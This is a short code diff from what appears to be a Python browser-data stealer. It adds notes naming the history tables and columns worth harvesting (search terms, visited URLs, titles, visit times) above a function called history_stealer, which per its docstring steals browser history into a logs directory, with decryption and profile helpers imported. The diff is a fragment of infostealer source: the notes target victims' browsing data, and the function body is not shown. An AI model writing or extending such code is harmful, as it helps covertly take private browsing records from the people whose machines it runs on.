@@ -4,6 +4,16 @@ import sqlite3
 from util import get_profiles, create_temp_file, create_log_file, try_decrypt
 
 
+"""
+Tables of interest from SQLi Recon:
+- keyword_search_terms: contains all the search terms
+    - Columns of interest: term
+- urls: 
+    - Columns of interest: title, url, last_visit_time
+    - There is also a column called 'hidden', which seems to refer to redirected sites (not very useful)
+"""
+
+
 def history_stealer(browser: dict, encryption_key: str) -> None:
     """ Steals browser history and places them into the logs directory """
     # Examine each profile
